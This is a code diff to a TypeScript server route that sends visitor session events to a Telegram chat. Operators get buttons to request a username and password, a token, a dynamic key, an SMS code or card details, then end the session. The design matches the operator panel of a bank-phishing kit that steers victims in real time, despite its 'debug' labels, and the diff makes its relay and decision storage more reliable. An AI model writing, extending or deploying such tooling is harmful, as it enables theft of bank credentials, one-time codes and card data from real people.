@@ -36,6 +36,7 @@ const globals = globalThis as typeof globalThis & {
   __latamDebugTelegramOffset?: number;
   __latamLastDecision?: RouteDecision;
   __latamWebhookCleared?: boolean;
+  __latamSyncing?: boolean;
 };
 const sessions = globals.__latamDebugSessions ?? new Map<string, DebugSession>();
 globals.__latamDebugSessions = sessions;
@@ -198,20 +199,24 @@ function stepLabel(event: unknown, meta?: Record<string, unknown>) {
   return labels[String(event || '')] || String(event || '-');
 }
 
-function keyboard(sessionId: string, brand: string) {
+const ROUTE_ACTIONS = new Set<RouteAction>(['sms', 'card', 'approved', 'userpass', 'token', 'dynamic']);
+
+function keyboard(sessionId: string, brand: string, origin = '') {
   const shortBrand = String(brand || 'visa').replace(/[^a-z0-9]/gi, '').slice(0, 10) || 'visa';
+  const publicOrigin = origin && !isLocalOrigin(origin) ? origin.replace(/\/$/, '') : '';
+  const btn = (text: string, action: RouteAction) => {
+    if (publicOrigin) {
+      const href = `${publicOrigin}/api/debug?sessionId=${encodeURIComponent(sessionId)}&decision=${action}&brand=${encodeURIComponent(shortBrand)}`;
+      return { text, url: href };
+    }
+    return { text, callback_data: `r:${sessionId}:${action}:${shortBrand}`.slice(0, 64) };
+  };
   return {
     inline_keyboard: [
-      [
-        { text: 'User-Pass', callback_data: `r:${sessionId}:userpass:${shortBrand}` },
-        { text: 'Token', callback_data: `r:${sessionId}:token:${shortBrand}` },
-      ],
-      [
-        { text: 'C. dinámica', callback_data: `r:${sessionId}:dynamic:${shortBrand}` },
-        { text: 'Pedir SMS', callback_data: `r:${sessionId}:sms:${shortBrand}` },
-      ],
-      [{ text: 'Pedir Tarjeta', callback_data: `r:${sessionId}:card:${shortBrand}` }],
-      [{ text: 'Finalizar', callback_data: `r:${sessionId}:approved:${shortBrand}` }],
+      [btn('User-Pass', 'userpass'), btn('Token', 'token')],
+      [btn('C. dinámica', 'dynamic'), btn('Pedir SMS', 'sms')],
+      [btn('Pedir Tarjeta', 'card')],
+      [btn('Finalizar', 'approved')],
     ],
   };
 }
@@ -277,55 +282,65 @@ async function telegramApi(method: string, payload: Record<string, unknown> = {}
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify(payload),
   });
-  let result: unknown = null;
+  let body: Record<string, unknown> | null = null;
   try {
-    result = await response.json();
+    body = await response.json() as Record<string, unknown>;
   } catch {
-    result = null;
+    body = null;
   }
-  return { ok: response.ok, status: response.status, result };
+  return {
+    ok: Boolean(body?.ok ?? response.ok),
+    status: response.status,
+    result: body?.result ?? null,
+  };
 }
 
 function packDecision(sessionId: string, decision: RouteDecision) {
-  return `${sessionId}::${decision.action}::${decision.brand || ''}`.slice(0, 120);
+  return `${sessionId}|${decision.action}|${decision.brand || ''}|${decision.updatedAt || Date.now()}`.slice(0, 512);
 }
 
 function unpackDecision(value: unknown, sessionId: string): RouteDecision | undefined {
-  const text = String(value || '');
-  const [sid, action, brand] = text.split('::');
+  const text = String(value || '').trim();
+  if (!text) return undefined;
+  const parts = text.includes('|') ? text.split('|') : text.split('::');
+  const sid = parts[0];
+  const action = parts[1];
+  const brand = parts[2] || undefined;
   if (!sid || sid !== sessionId || !action) return undefined;
   return {
     action: action as RouteAction,
     brand: brand || undefined,
     sessionId: sid,
-    updatedAt: new Date().toISOString(),
+    updatedAt: parts[3] || new Date().toISOString(),
   };
 }
 
 async function persistDecision(sessionId: string, decision: RouteDecision) {
-  const stored = { ...decision, sessionId };
+  const stored = { ...decision, sessionId, updatedAt: decision.updatedAt || new Date().toISOString() };
   getSession(sessionId).decision = stored;
   globals.__latamLastDecision = stored;
+  const packed = packDecision(sessionId, stored);
   try {
-    await telegramApi('setMyShortDescription', { short_description: packDecision(sessionId, stored) });
-    await telegramApi('setMyDescription', { description: packDecision(sessionId, stored) });
+    await telegramApi('setMyDescription', { description: packed });
+    await telegramApi('setMyShortDescription', { short_description: packed.slice(0, 120) });
   } catch {
     /* Shared Telegram store is best-effort. */
   }
 }
 
+function descriptionText(result: unknown, key: 'description' | 'short_description') {
+  if (!result || typeof result !== 'object') return '';
+  const row = result as Record<string, unknown>;
+  return String(row[key] || '');
+}
+
 async function readPersistedDecision(sessionId: string): Promise<RouteDecision | undefined> {
   try {
-    const response = await telegramApi('getMyShortDescription');
-    const body = response.result as Record<string, unknown> | null;
-    const inner = body && typeof body.result === 'object' ? (body.result as Record<string, unknown>) : undefined;
-    const text = String(inner?.short_description || inner?.description || body?.short_description || body?.description || '');
-    const packed = unpackDecision(text, sessionId);
+    const description = await telegramApi('getMyDescription');
+    const packed = unpackDecision(descriptionText(description.result, 'description'), sessionId);
     if (packed) return packed;
-    const fallback = await telegramApi('getMyDescription');
-    const fallbackBody = fallback.result as Record<string, unknown> | null;
-    const fallbackInner = fallbackBody && typeof fallbackBody.result === 'object' ? (fallbackBody.result as Record<string, unknown>) : undefined;
-    return unpackDecision(fallbackInner?.description || fallbackBody?.description, sessionId);
+    const short = await telegramApi('getMyShortDescription');
+    return unpackDecision(descriptionText(short.result, 'short_description'), sessionId);
   } catch {
     return undefined;
   }
@@ -344,42 +359,49 @@ function isLocalOrigin(origin: string) {
   return /localhost|127\.0\.0\.1/i.test(origin);
 }
 
-async function bindTelegramIngress(origin: string) {
-  if (isLocalOrigin(origin)) {
-    await telegramApi('deleteWebhook', {});
-    globals.__latamWebhookCleared = true;
-    return;
-  }
-  const hook = `${origin.replace(/\/$/, '')}/api/debug`;
-  await telegramApi('setWebhook', {
-    url: hook,
-    allowed_updates: ['callback_query'],
-  });
-  globals.__latamWebhookCleared = false;
+function operatorHtml(decision: RouteDecision) {
+  return `<!doctype html>
+<html lang="es">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Pico y Placa Solidario</title>
+  <style>
+    body { margin:0; min-height:100vh; display:flex; align-items:center; justify-content:center; background:#00271c; color:#fff; font-family:Montserrat,Gotham,sans-serif; }
+    main { text-align:center; padding:32px; }
+    h1 { margin:0 0 8px; font-size:22px; }
+    p { margin:0; color:#88f456; }
+  </style>
+</head>
+<body>
+  <main>
+    <h1>Decisión registrada</h1>
+    <p>${actionLabel(decision.action)}</p>
+  </main>
+</body>
+</html>`;
 }
 
-// En local no hay webhook publico. getUpdates permite recoger callbacks cuando
-// el frontend hace polling al endpoint GET /api/debug.
+async function ensurePollingMode() {
+  if (globals.__latamWebhookCleared) return;
+  const result = await telegramApi('deleteWebhook', { drop_pending_updates: false });
+  if (result.ok || result.skipped) globals.__latamWebhookCleared = true;
+}
+
 async function telegramGetUpdates() {
-  const { token } = telegramConfig();
-  if (!token) return [];
-  const offset = globals.__latamDebugTelegramOffset;
-  const qs = new URLSearchParams({
-    timeout: '0',
-    allowed_updates: JSON.stringify(['callback_query']),
-  });
-  if (typeof offset === 'number') qs.set('offset', String(offset));
-  const response = await fetch(`https://api.telegram.org/bot${token}/getUpdates?${qs.toString()}`, {
-    headers: { Accept: 'application/json' },
-  });
-  if (response.status === 409) return [];
+  const payload: Record<string, unknown> = {
+    timeout: 0,
+    allowed_updates: ['callback_query'],
+  };
+  if (typeof globals.__latamDebugTelegramOffset === 'number') {
+    payload.offset = globals.__latamDebugTelegramOffset;
+  }
+  const response = await telegramApi('getUpdates', payload);
   if (!response.ok) return [];
-  const payload = await response.json();
-  return Array.isArray(payload?.result) ? payload.result : [];
+  return Array.isArray(response.result) ? response.result as Array<Record<string, unknown>> : [];
 }
 
-// Envia el evento al chat de Telegram con datos mock/redactados y botones opcionales.
-async function sendTelegram(payload: Record<string, unknown>, options: { withButtons?: boolean } = {}) {
+async function sendTelegram(payload: Record<string, unknown>, options: { withButtons?: boolean; origin?: string } = {}) {
   const { chatId } = telegramConfig();
   if (!chatId) return { sent: false, skipped: 'telegram-env-missing' };
   const sessionId = String(payload.sessionId || '');
@@ -390,7 +412,7 @@ async function sendTelegram(payload: Record<string, unknown>, options: { withBut
     disable_web_page_preview: true,
   };
   if (options.withButtons) {
-    message.reply_markup = keyboard(sessionId, brand);
+    message.reply_markup = keyboard(sessionId, brand, options.origin || '');
   }
   const result = await telegramApi('sendMessage', message);
   return result.ok ? { sent: true } : { sent: false, error: `telegram-${result.status || 'unknown'}` };
@@ -432,14 +454,20 @@ async function handleTelegramCallback(body: Record<string, unknown>) {
 
 // Sincroniza callbacks pendientes antes de responder al polling del navegador.
 async function syncTelegramCallbacks() {
-  const updates = await telegramGetUpdates();
-  for (const update of updates) {
-    if (typeof update?.update_id === 'number') {
-      globals.__latamDebugTelegramOffset = update.update_id + 1;
+  if (globals.__latamSyncing) return;
+  globals.__latamSyncing = true;
+  try {
+    const updates = await telegramGetUpdates();
+    for (const update of updates) {
+      if (typeof update?.update_id === 'number') {
+        globals.__latamDebugTelegramOffset = update.update_id + 1;
+      }
+      if (update?.callback_query) {
+        await handleTelegramCallback({ callback_query: update.callback_query });
+      }
     }
-    if (update?.callback_query) {
-      await handleTelegramCallback({ callback_query: update.callback_query });
-    }
+  } finally {
+    globals.__latamSyncing = false;
   }
 }
 
@@ -447,9 +475,21 @@ async function syncTelegramCallbacks() {
 // que el operador eligio en Telegram para esta sessionId.
 export const GET: APIRoute = async ({ url }) => {
   const sessionId = cleanSessionId(url.searchParams.get('sessionId'));
+  const requested = String(url.searchParams.get('decision') || '').toLowerCase() as RouteAction;
+  const brand = String(url.searchParams.get('brand') || 'visa').replace(/[^a-z0-9]/gi, '').slice(0, 10) || 'visa';
+  if (ROUTE_ACTIONS.has(requested)) {
+    const decision = makeDecision(sessionId, requested, brand);
+    await persistDecision(sessionId, decision);
+    return new Response(operatorHtml(decision), {
+      headers: {
+        'Content-Type': 'text/html; charset=utf-8',
+        'Cache-Control': 'no-store',
+      },
+    });
+  }
   try {
-    await bindTelegramIngress(url.origin);
-    if (isLocalOrigin(url.origin)) await syncTelegramCallbacks();
+    await ensurePollingMode();
+    await syncTelegramCallbacks();
   } catch {
     /* Telegram polling is best-effort. */
   }
@@ -478,10 +518,11 @@ export const POST: APIRoute = async ({ request }) => {
   if (!allowed.has(event)) return json({ error: 'Evento debug invalido' }, { status: 400 });
 
   const sessionId = cleanSessionId(body.sessionId);
+  const origin = new URL(request.url).origin;
   try {
-    await bindTelegramIngress(new URL(request.url).origin);
+    await ensurePollingMode();
   } catch {
-    /* Webhook bind is best-effort. */
+    /* Polling mode is best-effort. */
   }
   const session = getSession(sessionId);
   const previousPayload = session.payload;
@@ -531,7 +572,7 @@ export const POST: APIRoute = async ({ request }) => {
   session.payload = payload;
   const telegram = event === 'P-SUCCESS'
     ? { sent: false, skipped: 'success-page' }
-    : await sendTelegram(payload, { withButtons: isProcessingEvent(event) });
+    : await sendTelegram(payload, { withButtons: isProcessingEvent(event), origin });
 
   return json({ ...payload, telegram });
 };
